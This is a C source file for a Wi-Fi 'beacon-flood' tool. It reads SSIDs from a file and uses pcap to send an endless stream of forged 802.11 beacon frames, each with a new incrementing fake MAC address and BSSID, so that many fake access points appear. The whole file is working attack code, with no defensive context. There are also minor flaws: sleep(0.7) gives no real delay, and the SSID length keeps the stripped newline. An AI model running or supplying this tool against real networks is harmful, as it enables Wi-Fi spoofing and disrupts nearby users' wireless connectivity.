#include "beacon.h"
pcap_t* pcap;
void sig_handler(int signum){

  pcap_close(pcap);
  exit(-1);
}
void init_packet(packet * pk){
    pk->radiotap.it_version = 0;
    pk->radiotap.it_pad = 0; 
    pk->radiotap.it_len = 0x18; 
    pk->radiotap.it_present = 0xa000402e;
    pk->BeaconFrame.type = 0x0080;
    pk->BeaconFrame.duration = 0x0;
    memset(pk->BeaconFrame.dest_mac, 0xff, 0x6);
    memset(pk->BeaconFrame.src_mac, 0x00, 0x6);
    memset(pk->BeaconFrame.bssid, 0x00, 0x6);
    pk->BeaconFrame.seq_num = 0;
    pk->BeaconFrame.timestamp = 0;
    pk->BeaconFrame.beacon_interval = 0;
    pk->BeaconFrame.capabilities_info = 0x1411;
    pk->BeaconFrame.tag_data[0].num = 0;
    pk->BeaconFrame.tag_data[1].num = 42;
    pk->BeaconFrame.tag_data[1].len = 1;
    pk->BeaconFrame.tag_data[1].data[0] = 2;

}

int main(int argc, char* argv[]){
    if(argc != 3 ){
        printf("usage : beacon-flood <interface> <ssid-list-file>\n");
        exit(-1);
    }
    packet send_packet;
    uint8_t errbuf[PCAP_ERRBUF_SIZE];
    char * interface_;
    FILE      *fp;
    char tempid[0x20];
    signal(SIGINT,sig_handler);
    
    interface_ = argv[1];
    if(!(fp = fopen( argv[2], "r"))){
        printf("SSID File Open Error ! \n");
        exit(-1);
    }
    
    pcap = pcap_open_live(interface_ , BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface_, errbuf);
        return -1;
    }
    
    memset(&send_packet, 0x00, sizeof(packet));
    init_packet(&send_packet);
    while(1){
         if(send_packet.BeaconFrame.src_mac[5] == 0xff){
            send_packet.BeaconFrame.src_mac[5] = 0x00;
            send_packet.BeaconFrame.src_mac[4]++;
            if(send_packet.BeaconFrame.src_mac[4]==0xff){
                send_packet.BeaconFrame.src_mac[4] = 0x00;
                send_packet.BeaconFrame.src_mac[3]++;
                if(send_packet.BeaconFrame.src_mac[3]==0xff){
                    send_packet.BeaconFrame.src_mac[3] = 0x00;
                    send_packet.BeaconFrame.src_mac[2]++;
                    if(send_packet.BeaconFrame.src_mac[2]==0xff){
                        send_packet.BeaconFrame.src_mac[2] = 0x00;
                        send_packet.BeaconFrame.src_mac[1]++;
                        if(send_packet.BeaconFrame.src_mac[1]==0xff){
                            send_packet.BeaconFrame.src_mac[1] = 0x00;
                        }
                    }
                }
            }
        }
    send_packet.BeaconFrame.src_mac[5]++;
    memcpy(send_packet.BeaconFrame.bssid, send_packet.BeaconFrame.src_mac, 6);
    memset(tempid,0,sizeof(tempid));
    if(fgets( tempid, sizeof( tempid), fp) == 0){
        fseek(fp,0,SEEK_SET);
        fgets( tempid, sizeof( tempid), fp);
    }
    
    memset(send_packet.BeaconFrame.tag_data,0,sizeof(send_packet.BeaconFrame.tag_data->data)*2);
    strcpy(send_packet.BeaconFrame.tag_data->data, tempid);
    send_packet.BeaconFrame.tag_data[0].len = strlen(tempid);
    if(send_packet.BeaconFrame.tag_data->data[send_packet.BeaconFrame.tag_data->len-1]== '\n'){
        send_packet.BeaconFrame.tag_data->data[send_packet.BeaconFrame.tag_data->len-1]=0;
    }
    if (pcap_sendpacket(pcap, (unsigned char*)&send_packet, sizeof(send_packet)) != 0){
            printf("Fail send_packet\n");
            exit (-1);
    }
    printf("%02X:%02X:%02X:%02X:%02X:%02X : %s\n",send_packet.BeaconFrame.src_mac[0],send_packet.BeaconFrame.src_mac[1],send_packet.BeaconFrame.src_mac[2],send_packet.BeaconFrame.src_mac[3],send_packet.BeaconFrame.src_mac[4],send_packet.BeaconFrame.src_mac[5],send_packet.BeaconFrame.tag_data[0].data);
    sleep(0.7);
    }

}
